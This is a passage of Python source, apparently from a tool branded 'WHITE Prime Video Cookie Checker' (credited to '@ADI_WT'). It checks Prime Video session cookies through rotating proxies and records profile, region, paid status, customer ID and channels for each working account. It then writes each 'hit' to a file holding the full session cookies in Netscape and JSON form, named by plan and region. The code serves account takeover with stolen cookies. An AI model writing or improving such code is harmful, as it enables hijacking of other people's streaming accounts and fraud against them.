            profile = pm.group(1)

        return {
            'profile': profile,
            'region': region,
            'plan': 'Paid' if is_paid else ('Free' if is_paid is False else 'Unknown'),
            'is_premium': is_paid or False,
            'customer_id': cid,
            'channels': channels_list
        }, 'valid'
    except requests.exceptions.ProxyError:
        if px:
            _mark_dead(px)
        return None, 'proxy_error'
    except:
        return None, 'error'


def _netscape_primevideo(d: dict) -> str:
    lines = ["# Netscape HTTP Cookie File", "# Prime Video Cookies - WHITE Checker | Owner: @ADI_WT", ""]
    for name, value in d.items():
        secure = "TRUE" if name.startswith("__Secure") or name.startswith("__Host") or name in ("session-token", "at-main") else "FALSE"
        lines.append(f".primevideo.com\tTRUE\t/\t{secure}\t0\t{name}\t{value}")
    return "\n".join(lines)


def format_hit_primevideo(result: dict, cookies_dict: dict, source: str) -> Tuple[str, str]:
    ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    netscape = _netscape_primevideo(cookies_dict)
    _chs = result.get('channels') or []
    channels_line = ("\n  Channels   : " + ", ".join(_chs)) if _chs else ""
    content = f"""════════════════════════════════════════════════════════
  WHITE Prime Video Cookie Checker  |  Owner: @ADI_WT
════════════════════════════════════════════════════════

  Checked At : {ts}
  Source     : {source}

════════════════════════════════════════════════════════
  ACCOUNT INFO
════════════════════════════════════════════════════════

  Profile    : {result.get('profile', 'Unknown')}
  Region     : {result.get('region', 'Unknown')}
  Plan       : {result.get('plan', 'Unknown')}
  Premium    : {'Yes' if result.get('is_premium') else 'No'}
  Customer ID: {result.get('customer_id', 'Unknown')}{channels_line}

════════════════════════════════════════════════════════
  COOKIES (Netscape Format)
════════════════════════════════════════════════════════
{netscape}

════════════════════════════════════════════════════════
  RAW COOKIES (JSON)
════════════════════════════════════════════════════════
{json.dumps(cookies_dict, indent=2, ensure_ascii=False)}

════════════════════════════════════════════════════════
  Owner: @ADI_WT | WHITE Prime Video Cookie Checker
════════════════════════════════════════════════════════
"""
    safe_region = re.sub(r'[<>:"/\|?*\s]', '_', result.get("region", "unknown"))
    safe_cid = result.get("customer_id", "unknown")[:10]
    safe_plan = 'paid' if result.get('is_premium') else 'free'
    filename = f"[{safe_plan}][pv_{safe_region}][{safe_cid}].txt"
    return content, filename
